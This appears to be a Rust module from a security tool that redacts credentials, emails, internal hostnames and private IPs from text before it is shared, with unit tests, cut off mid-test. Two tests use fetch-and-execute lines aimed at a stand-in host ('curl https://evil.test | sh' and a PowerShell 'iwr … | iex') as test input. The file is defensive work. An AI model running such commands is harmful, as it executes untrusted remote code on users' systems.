use once_cell::sync::Lazy;
use regex::Regex;

/// Credential redaction entry: `prefix_len` chars stay visible, rest → [REDACTED].
struct CredRedactEntry {
    label: String,
    regex: Regex,
    prefix_len: usize,
}

/// Target audience for [`redact_for_audience`]. Controls WHAT is redacted on top
/// of credentials (which are ALWAYS redacted):
/// - `PublicPaste` — most aggressive: internal hostnames, home paths, RFC1918
///   IPs in hostname context, plus all creds + customer IDs.
/// - `Llm` / `Generic` — secrets only; preserve stack traces / line numbers /
///   repo paths (an LLM needs them to debug).
/// - `Slack` / `GithubIssue` — secrets + internal hostnames, but keep
///   repo-relative paths.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ShareAudience {
    GithubIssue,
    Slack,
    Llm,
    PublicPaste,
    Generic,
}

impl ShareAudience {
    /// The token used in `share_patterns.toml`'s `audiences` array
    /// (case-sensitive). The CLI parses strings via [`Self::parse_cli`].
    fn toml_token(self) -> &'static str {
        match self {
            ShareAudience::GithubIssue => "github-issue",
            ShareAudience::Slack => "slack",
            ShareAudience::Llm => "llm",
            ShareAudience::PublicPaste => "public-paste",
            ShareAudience::Generic => "generic",
        }
    }

    /// Parse a `--target` / `--audience` CLI string (`None` on unknown).
    pub fn parse_cli(s: &str) -> Option<ShareAudience> {
        match s.trim() {
            "github-issue" | "githubissue" | "github" => Some(ShareAudience::GithubIssue),
            "slack" => Some(ShareAudience::Slack),
            "llm" => Some(ShareAudience::Llm),
            "public-paste" | "publicpaste" | "public" => Some(ShareAudience::PublicPaste),
            "generic" => Some(ShareAudience::Generic),
            _ => None,
        }
    }

    /// Human-readable list of accepted CLI values (for error messages).
    pub fn cli_values() -> &'static [&'static str] {
        &["github-issue", "slack", "llm", "public-paste", "generic"]
    }
}

/// One labeled redaction count from [`redact_for_audience`] (stable snake_case
/// `label` + number of matches replaced).
#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize)]
pub struct RedactionCount {
    pub label: String,
    pub count: usize,
}

/// Output of [`redact_for_audience`]: redacted content + per-label counts.
#[derive(Debug, Clone, serde::Serialize)]
pub struct RedactReport {
    pub redacted_content: String,
    pub redactions: Vec<RedactionCount>,
}

impl RedactReport {
    /// Sum of all per-label counts.
    pub fn total(&self) -> usize {
        self.redactions.iter().map(|r| r.count).sum()
    }
}

/// A share-pattern entry loaded from `share_patterns.toml`.
struct SharePatternEntry {
    label: String,
    regex: Regex,
    /// Audience tokens this pattern applies to (strings, so unknown tokens are
    /// ignored forward-compatibly).
    audiences: Vec<String>,
}

static SHARE_PATTERNS: Lazy<Vec<SharePatternEntry>> = Lazy::new(|| {
    #[derive(serde::Deserialize)]
    struct File {
        pattern: Option<Vec<Pat>>,
    }
    #[derive(serde::Deserialize)]
    struct Pat {
        id: String,
        regex: String,
        audiences: Vec<String>,
    }

    let toml_str = include_str!("../assets/data/share_patterns.toml");
    let file: File = toml::from_str(toml_str).expect("invalid share_patterns.toml");

    let mut entries = Vec::new();
    if let Some(patterns) = file.pattern {
        for p in patterns {
            match Regex::new(&p.regex) {
                Ok(re) => entries.push(SharePatternEntry {
                    label: p.id,
                    regex: re,
                    audiences: p.audiences,
                }),
                Err(e) => {
                    eprintln!("tirith: warning: invalid share pattern '{}': {e}", p.id);
                }
            }
        }
    }
    entries
});

/// Credential patterns loaded from credential_patterns.toml at compile time.
static CREDENTIAL_REDACT_PATTERNS: Lazy<Vec<CredRedactEntry>> = Lazy::new(|| {
    #[derive(serde::Deserialize)]
    struct CredFile {
        pattern: Option<Vec<CredPat>>,
        private_key_pattern: Option<Vec<PkPat>>,
    }
    #[derive(serde::Deserialize)]
    struct CredPat {
        id: String,
        regex: String,
        redact_prefix_len: Option<usize>,
    }
    #[derive(serde::Deserialize)]
    struct PkPat {
        id: String,
        #[allow(dead_code)]
        regex: String,
        redact_regex: Option<String>,
    }

    let toml_str = include_str!("../assets/data/credential_patterns.toml");
    let cred_file: CredFile = toml::from_str(toml_str).expect("invalid credential_patterns.toml");

    let mut entries = Vec::new();
    if let Some(patterns) = cred_file.pattern {
        for p in patterns {
            if let Ok(re) = Regex::new(&p.regex) {
                entries.push(CredRedactEntry {
                    label: p.id,
                    regex: re,
                    prefix_len: p.redact_prefix_len.unwrap_or(4),
                });
            }
        }
    }
    if let Some(pk_patterns) = cred_file.private_key_pattern {
        for pk in pk_patterns {
            // `redact_regex` covers the full PEM block; fall back to the
            // header-only regex when omitted.
            let redact_pattern = pk.redact_regex.as_deref().unwrap_or(&pk.regex);
            if let Ok(re) = Regex::new(redact_pattern) {
                entries.push(CredRedactEntry {
                    label: pk.id,
                    regex: re,
                    prefix_len: 0,
                });
            }
        }
    }
    entries
});

/// Built-in redaction patterns: (label, regex).
static BUILTIN_PATTERNS: Lazy<Vec<(&'static str, Regex)>> = Lazy::new(|| {
    vec![
        (
            "OpenAI API Key",
            Regex::new(r"sk-[A-Za-z0-9]{20,}").unwrap(),
        ),
        ("AWS Access Key", Regex::new(r"AKIA[A-Z0-9]{16}").unwrap()),
        ("GitHub PAT", Regex::new(r"ghp_[A-Za-z0-9]{36,}").unwrap()),
        (
            "GitHub Server Token",
            Regex::new(r"ghs_[A-Za-z0-9]{36,}").unwrap(),
        ),
        (
            "Anthropic API Key",
            Regex::new(r"sk-ant-[A-Za-z0-9\-]{20,}").unwrap(),
        ),
        (
            "Slack Token",
            Regex::new(r"xox[bprs]-[A-Za-z0-9\-]{10,}").unwrap(),
        ),
        (
            "Email Address",
            Regex::new(r"[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}").unwrap(),
        ),
    ]
});

/// The credential-shape subset of [`BUILTIN_PATTERNS`] used by
/// [`looks_secret_shaped`]: OpenAI / AWS / GitHub / Anthropic / Slack tokens.
///
/// Deliberately EXCLUDES the Email regex (index 6 of `BUILTIN_PATTERNS`): a
/// secret-shape gate that matched `?email=foo@bar.com` would fire High false
/// positives on ordinary mailto links in agent output, which is the whole point
/// of carving this narrow set out instead of reusing `BUILTIN_PATTERNS` wholesale.
///
/// Each regex here is anchored with `\A`…`\z` because [`looks_secret_shaped`]
/// tests a single already-isolated token (a URL query-param value), not a free-
/// text haystack: an anchored full match avoids treating `prefix-sk-...suffix`
/// junk as a key while still matching a bare credential value.
static SECRET_SHAPE_PATTERNS: Lazy<Vec<Regex>> = Lazy::new(|| {
    [
        r"\Ask-[A-Za-z0-9]{20,}\z",          // OpenAI API key
        r"\AAKIA[A-Z0-9]{16}\z",             // AWS access key id
        r"\Aghp_[A-Za-z0-9]{36,}\z",         // GitHub PAT
        r"\Aghs_[A-Za-z0-9]{36,}\z",         // GitHub server token
        r"\Ask-ant-[A-Za-z0-9\-]{20,}\z",    // Anthropic API key
        r"\Axox[bprs]-[A-Za-z0-9\-]{10,}\z", // Slack token
    ]
    .iter()
    .map(|p| Regex::new(p).expect("static secret-shape regex"))
    .collect()
});

/// Shannon entropy of `s` in bits per character (0.0 for the empty string).
/// Used by [`looks_secret_shaped`] to gate the generic long-opaque-token arm so a
/// low-entropy run (`aaaaaaaa…`, a repeated word) is not mistaken for a secret.
fn shannon_entropy_bits_per_char(s: &str) -> f64 {
    if s.is_empty() {
        return 0.0;
    }
    let mut counts: std::collections::HashMap<char, usize> = std::collections::HashMap::new();
    let mut total = 0usize;
    for c in s.chars() {
        *counts.entry(c).or_insert(0) += 1;
        total += 1;
    }
    let total = total as f64;
    counts
        .values()
        .map(|&n| {
            let p = n as f64 / total;
            -p * p.log2()
        })
        .sum()
}

/// `true` when `s` has the SHAPE of a leaked credential: a recognised provider
/// token (OpenAI / AWS / GitHub / Anthropic / Slack — see [`SECRET_SHAPE_PATTERNS`]),
/// OR a long opaque high-entropy token (`[A-Za-z0-9_-]{32,}` with Shannon entropy
/// >= 4.0 bits/char). The narrow set EXCLUDES email addresses on purpose.
///
/// Intended for an ALREADY-ISOLATED token (e.g. a single URL query-param value),
/// not a free-text scan: the provider patterns are anchored, and the generic arm
/// requires the WHOLE string to be one opaque token. This keeps the
/// `OutputDataExfiltration` "secret-in-query" detection low-false-positive
/// (`?page=2`, `?email=foo@bar.com`, `?q=hello+world` do not match).
pub fn looks_secret_shaped(s: &str) -> bool {
    if SECRET_SHAPE_PATTERNS.iter().any(|re| re.is_match(s)) {
        return true;
    }
    // Generic long opaque token: 32+ url-safe chars, no other byte classes, and
    // high entropy (a real random secret), so a long lowercase word or a repeated
    // run does not trip it.
    let len = s.chars().count();
    if len >= 32
        && s.chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '-')
        && shannon_entropy_bits_per_char(s) >= 4.0
    {
        return true;
    }
    false
}

/// Redact sensitive content from a string using built-in and credential patterns.
pub fn redact(input: &str) -> String {
    let mut result = input.to_string();
    // Built-ins first (labeled replacements like `[REDACTED:Foo]`).
    for (label, regex) in BUILTIN_PATTERNS.iter() {
        result = regex
            .replace_all(&result, format!("[REDACTED:{label}]"))
            .into_owned();
    }
    // Credential patterns afterwards, preserving a short prefix.
    for entry in CREDENTIAL_REDACT_PATTERNS.iter() {
        result = entry
            .regex
            .replace_all(&result, |caps: &regex::Captures| {
                let matched = &caps[0];
                let prefix: String = matched.chars().take(entry.prefix_len).collect();
                format!("{prefix}[REDACTED]")
            })
            .into_owned();
    }
    result
}

/// M11 ch3 — the canary-detection scan driving
/// [`crate::verdict::RuleId::CanaryTokenTouched`]. Returns one
/// [`crate::canary::CanaryHit`] per REGISTERED token found (deduped by id); the
/// single entry point for both the analyze and analyze_output paths.
///
/// A STORE lookup, not a shape match: only registered tokens match (an unrelated
/// real credential fires `CredentialInText`/`HighEntropySecret` instead).
/// Near-noop when the store is empty/absent. The token value is NEVER returned —
/// only id/kind/callback — so this can't leak a planted secret.
pub fn detect_canaries(input: &str) -> Vec<crate::canary::CanaryHit> {
    crate::canary::detect(input)
}

/// Pre-compiled set of custom DLP patterns.
pub struct CompiledCustomPatterns {
    patterns: Vec<Regex>,
}

impl CompiledCustomPatterns {
    /// Compile custom DLP patterns once for reuse across calls.
    pub fn new(raw_patterns: &[String]) -> Self {
        let patterns = raw_patterns
            .iter()
            .filter_map(|pat_str| match Regex::new(pat_str) {
                Ok(re) => Some(re),
                Err(e) => {
                    eprintln!("tirith: warning: invalid custom DLP pattern '{pat_str}': {e}");
                    None
                }
            })
            .collect();
        Self { patterns }
    }
}

/// Redact using both built-in and custom patterns from policy.
pub fn redact_with_custom(input: &str, custom_patterns: &[String]) -> String {
    let mut result = redact(input);
    for pat_str in custom_patterns {
        if pat_str.len() > 1024 {
            eprintln!(
                "tirith: DLP pattern too long ({} chars), skipping",
                pat_str.len()
            );
            continue;
        }
        match Regex::new(pat_str) {
            Ok(re) => {
                result = re.replace_all(&result, "[REDACTED:custom]").into_owned();
            }
            Err(e) => {
                eprintln!("tirith: warning: invalid custom DLP pattern '{pat_str}': {e}");
            }
        }
    }
    result
}

/// Redact using built-in + pre-compiled custom patterns (no per-call recompile).
pub fn redact_with_compiled(input: &str, compiled: &CompiledCustomPatterns) -> String {
    let mut result = redact(input);
    for re in &compiled.patterns {
        result = re.replace_all(&result, "[REDACTED:custom]").into_owned();
    }
    result
}

/// Stable snake_case label for a built-in pattern (consumed by `--json` and the
/// stderr summary, not the prose `[REDACTED:Name]` token).
fn builtin_label_for(idx: usize) -> &'static str {
    match idx {
        0 => "openai_api_key",
        1 => "aws_access_key_builtin",
        2 => "github_pat_builtin",
        3 => "github_server_token",
        4 => "anthropic_api_key_builtin",
        5 => "slack_token_builtin",
        6 => "email_address",
        _ => "builtin_secret",
    }
}

/// Audience-aware redaction. Always strips credentials, plus the
/// `share_patterns.toml` patterns matching the audience.
///
/// `PublicPaste` extras: internal hostnames, home paths, and RFC1918 IPv4 in
/// hostname context (public IPs like `1.1.1.1` are NOT touched). `Llm`/`Generic`
/// strip secrets only — preserving stack traces / paths / line numbers is
/// intentional (over-redaction starves the LLM of debug context).
pub fn redact_for_audience(input: &str, audience: ShareAudience) -> RedactReport {
    redact_for_audience_with_custom(input, audience, &[])
}

/// Like [`redact_for_audience`] but also redacts `policy.share.
/// customer_id_patterns`, all aggregated under the `customer_id` label.
pub fn redact_for_audience_with_custom(
    input: &str,
    audience: ShareAudience,
    customer_id_patterns: &[String],
) -> RedactReport {
    use std::collections::HashMap;

    let mut counts: HashMap<String, usize> = HashMap::new();
    let mut order: Vec<String> = Vec::new();
    let bump =
        |label: &str, n: usize, counts: &mut HashMap<String, usize>, order: &mut Vec<String>| {
            if n == 0 {
                return;
            }
            if !counts.contains_key(label) {
                order.push(label.to_string());
            }
            *counts.entry(label.to_string()).or_insert(0) += n;
        };

    let mut result = input.to_string();

    // 1. Credential patterns first — ahead of built-ins so a built-in's labeled
    //    output doesn't shadow a credential match.
    for entry in CREDENTIAL_REDACT_PATTERNS.iter() {
        let matches = entry.regex.find_iter(&result).count();
        if matches > 0 {
            let prefix_len = entry.prefix_len;
            result = entry
                .regex
                .replace_all(&result, |caps: &regex::Captures| {
                    let matched = &caps[0];
                    let prefix: String = matched.chars().take(prefix_len).collect();
                    format!("{prefix}[REDACTED]")
                })
                .into_owned();
            bump(&entry.label, matches, &mut counts, &mut order);
        }
    }

    // 2. Built-in patterns (every audience) — long-tail providers not in
    //    credential_patterns.toml.
    for (idx, (label, regex)) in BUILTIN_PATTERNS.iter().enumerate() {
        let matches = regex.find_iter(&result).count();
        if matches > 0 {
            result = regex
                .replace_all(&result, format!("[REDACTED:{label}]"))
                .into_owned();
            bump(builtin_label_for(idx), matches, &mut counts, &mut order);
        }
    }

    // 3. Customer-ID patterns from policy (labeled `customer_id`, aggregated).
    for pat_str in customer_id_patterns {
        if pat_str.len() > 1024 {
            eprintln!(
                "tirith: customer_id pattern too long ({} chars), skipping",
                pat_str.len()
            );
            continue;
        }
        match Regex::new(pat_str) {
            Ok(re) => {
                let matches = re.find_iter(&result).count();
                if matches > 0 {
                    result = re
                        .replace_all(&result, "[REDACTED:customer_id]")
                        .into_owned();
                    bump("customer_id", matches, &mut counts, &mut order);
                }
            }
            Err(e) => {
                eprintln!("tirith: warning: invalid customer_id pattern '{pat_str}': {e}");
            }
        }
    }

    // 4. Share patterns (audience-filtered).
    let token = audience.toml_token();
    for entry in SHARE_PATTERNS.iter() {
        if !entry.audiences.iter().any(|a| a == token) {
            continue;
        }
        let matches = entry.regex.find_iter(&result).count();
        if matches > 0 {
            let label = entry.label.clone();
            result = entry
                .regex
                .replace_all(&result, format!("[REDACTED:{label}]").as_str())
                .into_owned();
            bump(&entry.label, matches, &mut counts, &mut order);
        }
    }

    // 5. Private-IPv4 redaction (public-paste only) — see `apply_private_ipv4`.
    if matches!(audience, ShareAudience::PublicPaste) {
        let (new_result, n) = apply_private_ipv4(&result);
        result = new_result;
        bump("private_ipv4", n, &mut counts, &mut order);
    }

    let redactions = order
        .into_iter()
        .map(|label| RedactionCount {
            count: counts[&label],
            label,
        })
        .collect();

    RedactReport {
        redacted_content: result,
        redactions,
    }
}

/// Redact RFC1918 private IPv4 in hostname context. Returns `(new, n)`.
///
/// Narrow to avoid false positives: the IP must match an RFC1918 range AND
/// either (1) be preceded by `server`/`host`/`hostname`/`connect`/`at` within 20
/// chars, OR (2) be on its own line. Public IPs (`1.1.1.1`, `8.8.8.8`) are NOT
/// touched; even a private IP is left alone without a context signal (readmes
/// reference private CIDRs as examples).
fn apply_private_ipv4(input: &str) -> (String, usize) {
    static IP_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(concat!(
            r"\b(",
            r"10\.(?:[0-9]{1,3}\.){2}[0-9]{1,3}",
            r"|172\.(?:1[6-9]|2[0-9]|3[01])\.[0-9]{1,3}\.[0-9]{1,3}",
            r"|192\.168\.[0-9]{1,3}\.[0-9]{1,3}",
            r")\b",
        ))
        .unwrap()
    });

    let bytes = input.as_bytes();
    let mut out = String::with_capacity(input.len());
    let mut cursor = 0usize;
    let mut count = 0usize;

    for cap in IP_RE.find_iter(input) {
        let start = cap.start();
        let end = cap.end();

        // Up-to-20-byte preceding window for the keyword check. Snap forward to
        // a char boundary — slicing inside a multibyte UTF-8 sequence panics
        // (regression: multibyte chars before the IP).
        let mut window_start = start.saturating_sub(20);
        while window_start < start && !input.is_char_boundary(window_start) {
            window_start += 1;
        }
        let preceding = &input[window_start..start];

        // Either trigger suffices.
        let keyword_context = has_trailing_context_keyword(preceding);
        let own_line = is_on_own_line(bytes, start, end);

        if !(keyword_context || own_line) {
            continue;
        }

        out.push_str(&input[cursor..start]);
        out.push_str("[REDACTED:private_ipv4]");
        cursor = end;
        count += 1;
    }
    out.push_str(&input[cursor..]);

    (out, count)
}

/// True when `preceding` ends with a hostname-context keyword + whitespace.
fn has_trailing_context_keyword(preceding: &str) -> bool {
    static KW_RE: Lazy<Regex> =
        Lazy::new(|| Regex::new(r"(?i)\b(server|host|hostname|connect|at)\s+$").unwrap());
    KW_RE.is_match(preceding)
}

/// True when `[start..end)` is the only non-whitespace content on its line.
fn is_on_own_line(bytes: &[u8], start: usize, end: usize) -> bool {
    // Walk back to line start; require only whitespace.
    let mut i = start;
    while i > 0 {
        let b = bytes[i - 1];
        if b == b'\n' {
            break;
        }
        if !(b == b' ' || b == b'\t') {
            return false;
        }
        i -= 1;
    }
    // Walk forward; require only whitespace until EOL/EOF.
    let mut j = end;
    while j < bytes.len() {
        let b = bytes[j];
        if b == b'\n' {
            return true;
        }
        if !(b == b' ' || b == b'\t' || b == b'\r') {
            return false;
        }
        j += 1;
    }
    true
}

/// Redact shell-style assignment values such as `KEY=value` before user content
/// is serialized into logs or JSON output.
pub fn redact_shell_assignments(input: &str) -> String {
    let chars: Vec<char> = input.chars().collect();
    let mut out = String::with_capacity(input.len());
    let mut i = 0;

    while i < chars.len() {
        if let Some((prefix, next)) = redact_powershell_env_assignment(&chars, i) {
            out.push_str(&prefix);
            out.push_str("[REDACTED]");
            i = next;
            continue;
        }

        if is_assignment_start(&chars, i) {
            let name_start = i;
            i += 1;
            while i < chars.len() && (chars[i].is_ascii_alphanumeric() || chars[i] == '_') {
                i += 1;
            }
            if i < chars.len() && chars[i] == '=' {
                let name: String = chars[name_start..i].iter().collect();
                out.push_str(&name);
                out.push_str("=[REDACTED]");
                i += 1;
                i = skip_assignment_value(&chars, i);
                continue;
            }
            out.push(chars[name_start]);
            i = name_start + 1;
            continue;
        }

        out.push(chars[i]);
        i += 1;
    }

    out
}

/// Redact a command-like string for public output by scrubbing assignment values
/// first, then applying built-in and custom DLP patterns.
pub fn redact_command_text(input: &str, custom_patterns: &[String]) -> String {
    let scrubbed = redact_shell_assignments(input);
    redact_with_custom(&scrubbed, custom_patterns)
}

/// Return a redacted clone of the provided findings for public-facing output.
pub fn redacted_findings(
    findings: &[crate::verdict::Finding],
    custom_patterns: &[String],
) -> Vec<crate::verdict::Finding> {
    let mut redacted = findings.to_vec();
    redact_findings(&mut redacted, custom_patterns);
    redacted
}

/// Redact sensitive content from a Finding's string fields in-place.
pub fn redact_finding(finding: &mut crate::verdict::Finding, custom_patterns: &[String]) {
    finding.title = redact_with_custom(&finding.title, custom_patterns);
    finding.description = redact_with_custom(&finding.description, custom_patterns);
    if let Some(ref mut v) = finding.human_view {
        *v = redact_with_custom(v, custom_patterns);
    }
    if let Some(ref mut v) = finding.agent_view {
        *v = redact_with_custom(v, custom_patterns);
    }
    for ev in &mut finding.evidence {
        redact_evidence(ev, custom_patterns);
    }
}

fn redact_evidence(ev: &mut crate::verdict::Evidence, custom_patterns: &[String]) {
    use crate::verdict::Evidence;
    match ev {
        Evidence::Url { raw } => {
            *raw = redact_with_custom(raw, custom_patterns);
        }
        Evidence::CommandPattern { matched, .. } => {
            *matched = redact_command_text(matched, custom_patterns);
        }
        Evidence::EnvVar { value_preview, .. } => {
            *value_preview = redact_with_custom(value_preview, custom_patterns);
        }
        Evidence::Text { detail } => {
            *detail = redact_command_text(detail, custom_patterns);
        }
        Evidence::ByteSequence { description, .. } => {
            *description = redact_with_custom(description, custom_patterns);
        }
        // HostComparison / HomoglyphAnalysis hold no user content — skip.
        _ => {}
    }
}

/// Redact all findings in a verdict in-place.
pub fn redact_verdict(verdict: &mut crate::verdict::Verdict, custom_patterns: &[String]) {
    for f in &mut verdict.findings {
        redact_finding(f, custom_patterns);
    }
}

/// Redact all findings in a slice in-place.
pub fn redact_findings(findings: &mut [crate::verdict::Finding], custom_patterns: &[String]) {
    for f in findings.iter_mut() {
        redact_finding(f, custom_patterns);
    }
}

fn is_assignment_boundary(prev: char) -> bool {
    prev.is_ascii_whitespace() || matches!(prev, ';' | '|' | '&' | '(' | '\n')
}

fn is_assignment_start(chars: &[char], idx: usize) -> bool {
    let ch = chars[idx];
    if !(ch.is_ascii_alphabetic() || ch == '_') {
        return false;
    }
    if idx > 0 && !is_assignment_boundary(chars[idx - 1]) {
        return false;
    }
    true
}

fn skip_assignment_value(chars: &[char], mut idx: usize) -> usize {
    let mut in_single = false;
    let mut in_double = false;
    let mut escaped = false;

    while idx < chars.len() {
        let ch = chars[idx];
        if escaped {
            escaped = false;
            idx += 1;
            continue;
        }
        if !in_single && ch == '\\' {
            escaped = true;
            idx += 1;
            continue;
        }
        if !in_double && ch == '\'' {
            in_single = !in_single;
            idx += 1;
            continue;
        }
        if !in_single && ch == '"' {
            in_double = !in_double;
            idx += 1;
            continue;
        }
        if !in_single
            && !in_double
            && (ch.is_ascii_whitespace() || matches!(ch, ';' | '|' | '&' | '\n'))
        {
            break;
        }
        idx += 1;
    }

    idx
}

fn redact_powershell_env_assignment(chars: &[char], idx: usize) -> Option<(String, usize)> {
    if idx > 0 && !is_assignment_boundary(chars[idx - 1]) {
        return None;
    }
    if chars.get(idx) != Some(&'$') {
        return None;
    }
    let prefix = ['e', 'n', 'v', ':'];
    for (offset, expected) in prefix.iter().enumerate() {
        let ch = chars.get(idx + 1 + offset)?;
        if !ch.eq_ignore_ascii_case(expected) {
            return None;
        }
    }

    let name_start = idx + 5;
    let first = *chars.get(name_start)?;
    if !(first.is_ascii_alphabetic() || first == '_') {
        return None;
    }

    let mut i = name_start + 1;
    while i < chars.len() && (chars[i].is_ascii_alphanumeric() || chars[i] == '_') {
        i += 1;
    }
    let mut value_start = i;
    while value_start < chars.len() && chars[value_start].is_ascii_whitespace() {
        value_start += 1;
    }
    if chars.get(value_start) != Some(&'=') {
        return None;
    }
    value_start += 1;
    while value_start < chars.len() && chars[value_start].is_ascii_whitespace() {
        value_start += 1;
    }

    let prefix_text: String = chars[idx..value_start].iter().collect();
    let value_end = skip_assignment_value(chars, value_start);
    Some((prefix_text, value_end))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_redact_openai_key() {
        let key = concat!("sk-", "abcdefghijklmnopqrstuvwxyz12345678");
        let input = format!("export OPENAI_API_KEY={key}");
        let redacted = redact(&input);
        assert!(!redacted.contains("sk-abcdef"));
        assert!(redacted.contains("[REDACTED:OpenAI API Key]"));
    }

    #[test]
    fn test_redact_aws_key() {
        let input = "AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE";
        let redacted = redact(input);
        assert!(!redacted.contains("AKIAIOSFODNN7EXAMPLE"));
        assert!(redacted.contains("[REDACTED:AWS Access Key]"));
    }

    #[test]
    fn test_redact_github_pat() {
        let pat = concat!("gh", "p_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijkl");
        let input = format!("GITHUB_TOKEN={pat}");
        let redacted = redact(&input);
        assert!(!redacted.contains("ghp_ABCDEF"));
        assert!(redacted.contains("[REDACTED:GitHub PAT]"));
    }

    #[test]
    fn test_redact_email() {
        let input = "contact: user@example.com for details";
        let redacted = redact(input);
        assert!(!redacted.contains("user@example.com"));
        assert!(redacted.contains("[REDACTED:Email Address]"));
    }

    #[test]
    fn test_redact_no_false_positive() {
        let input = "normal text without any secrets";
        let redacted = redact(input);
        assert_eq!(input, redacted);
    }

    #[test]
    fn test_redact_with_custom() {
        let input = "internal ref: PROJ-12345 in the system";
        let custom = vec![r"PROJ-\d+".to_string()];
        let redacted = redact_with_custom(input, &custom);
        assert!(!redacted.contains("PROJ-12345"));
        assert!(redacted.contains("[REDACTED:custom]"));
    }

    #[test]
    fn test_redact_anthropic_key() {
        let key = concat!("sk-ant-api03-", "abcdefghijklmnop");
        let input = format!("ANTHROPIC_API_KEY={key}");
        let redacted = redact(&input);
        assert!(!redacted.contains("sk-ant-api03"));
        assert!(redacted.contains("[REDACTED:Anthropic API Key]"));
    }

    #[test]
    fn test_redact_finding_covers_all_fields() {
        use crate::verdict::{Evidence, Finding, RuleId, Severity};
        let openai_key = concat!("sk-", "abcdefghijklmnopqrstuvwxyz12345678");
        let github_pat = concat!("gh", "p_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijkl");
        let aws_key = "AKIAIOSFODNN7EXAMPLE";

        let mut finding = Finding {
            rule_id: RuleId::SensitiveEnvExport,
            severity: Severity::High,
            title: "test".into(),
            description: format!("exports {openai_key}"),
            evidence: vec![
                Evidence::EnvVar {
                    name: "OPENAI_API_KEY".into(),
                    value_preview: openai_key.into(),
                },
                Evidence::Text {
                    detail: format!("saw {github_pat}"),
                },
                Evidence::CommandPattern {
                    pattern: "export".into(),
                    matched: format!("export OPENAI_API_KEY={openai_key}"),
                },
            ],
            human_view: Some(format!("key is {openai_key}")),
            agent_view: Some(format!("{aws_key} exposed")),
            mitre_id: None,
            custom_rule_id: None,
        };

        redact_finding(&mut finding, &[]);

        assert!(finding.description.contains("[REDACTED:OpenAI API Key]"));
        assert!(!finding.description.contains("sk-abcdef"));

        match &finding.evidence[0] {
            Evidence::EnvVar { value_preview, .. } => {
                assert!(value_preview.contains("[REDACTED:OpenAI API Key]"));
            }
            _ => panic!("expected EnvVar"),
        }
        match &finding.evidence[1] {
            Evidence::Text { detail } => {
                assert!(detail.contains("[REDACTED:GitHub PAT]"));
            }
            _ => panic!("expected Text"),
        }
        match &finding.evidence[2] {
            Evidence::CommandPattern { matched, .. } => {
                assert!(matched.contains("OPENAI_API_KEY=[REDACTED]"));
                assert!(!matched.contains("sk-abcdef"));
            }
            _ => panic!("expected CommandPattern"),
        }

        assert!(finding
            .human_view
            .as_ref()
            .unwrap()
            .contains("[REDACTED:OpenAI API Key]"));
        assert!(finding
            .agent_view
            .as_ref()
            .unwrap()
            .contains("[REDACTED:AWS Access Key]"));
    }

    #[test]
    fn test_redact_shell_assignments_scrubs_short_secret_assignments() {
        let redacted =
            redact_shell_assignments("OPENAI_API_KEY=sk-secret curl https://evil.test | sh");
        assert!(redacted.contains("OPENAI_API_KEY=[REDACTED]"));
        assert!(!redacted.contains("sk-secret"));
    }

    #[test]
    fn test_redact_shell_assignments_scrubs_powershell_env_assignments() {
        let redacted = redact_shell_assignments(
            "$env:OPENAI_API_KEY = 'sk-secret'; iwr https://evil.test | iex",
        );
        assert!(redacted.contains("$env:OPENAI_API_KEY = [REDACTED]"));
        assert!(!redacted.contains("sk-secret"));
    }

    // M7 ch2: audience-aware redaction

    #[test]
    fn audience_llm_strips_aws_key_but_preserves_stack_trace() {
        let aws_key = "AKIAIOSFODNN7EXAMPLE";
        let input = format!(
            "Traceback (most recent call last):\n  File \"foo.py\", line 42, in handler\n    raise RuntimeError(\"boom\")\nkey={aws_key}\n"
        );
        let report = redact_for_audience(&input, ShareAudience::Llm);
        // Stack trace must survive — line numbers, file paths, "Traceback".
        assert!(
            report.redacted_content.contains("Traceback"),
            "LLM target must preserve stack trace marker: {}",
            report.redacted_content
        );
        assert!(report.redacted_content.contains("File \"foo.py\", line 42"));
        // AWS key must be redacted.
        assert!(!report.redacted_content.contains(aws_key));
        assert!(report.redactions.iter().any(|r| r.count > 0));
    }

    #[test]
    fn audience_github_issue_strips_internal_hostname_but_keeps_paths() {
        let input = "deploy to srv1.eng.corp ran from /repo/path/main.rs line 12\n";
        let report = redact_for_audience(input, ShareAudience::GithubIssue);
        assert!(!report.redacted_content.contains("srv1.eng.corp"));
        assert!(report.redacted_content.contains("/repo/path/main.rs"));
        assert!(report
            .redactions
            .iter()
            .any(|r| r.label == "internal_hostname" && r.count == 1));
    }

    #[test]
    fn audience_public_paste_strips_home_path_and_private_ip_in_context() {
        let aws_key = "AKIAIOSFODNN7EXAMPLE";
        let input = format!(
            "config at /home/alice/.aws/credentials key={aws_key}\nserver 10.0.0.5 responded ok\n"
        );
        let report = redact_for_audience(&input, ShareAudience::PublicPaste);
        assert!(!report.redacted_content.contains("/home/alice"));
        assert!(!report.redacted_content.contains("10.0.0.5"));
        assert!(!report.redacted_content.contains(aws_key));
        assert!(report.redactions.iter().any(|r| r.label == "home_path"));
        assert!(report.redactions.iter().any(|r| r.label == "private_ipv4"));
    }

    #[test]
    fn private_ipv4_keyword_window_preserves_keyword_text() {
        let input = "server 10.0.0.5 ok";
        let report = redact_for_audience(input, ShareAudience::PublicPaste);
        // The keyword "server" must survive — we only replace the IP literal.
        assert!(
            report.redacted_content.starts_with("server "),
            "keyword must be preserved, got: {}",
            report.redacted_content
        );
        assert!(report.redacted_content.contains("[REDACTED:private_ipv4]"));
    }

    #[test]
    fn private_ipv4_public_ip_is_not_redacted() {
        // A public DNS IP must NOT be touched even with a `server` keyword.
        let input = "server 1.1.1.1 responded\n";
        let report = redact_for_audience(input, ShareAudience::PublicPaste);
        assert!(report.redacted_content.contains("1.1.1.1"));
        assert!(!report.redacted_content.contains("[REDACTED:private_ipv4]"));
    }

    #[test]
    fn private_ipv4_without_context_or_own_line_is_not_redacted() {
        // Inline, no keyword and not on its own line → NOT redacted (readmes
        // reference private CIDRs as examples).
        let input = "use 192.168.0.1 as your gateway and 10.0.0.1 for DNS\n";
        let report = redact_for_audience(input, ShareAudience::PublicPaste);
        assert!(report.redacted_content.contains("192.168.0.1"));
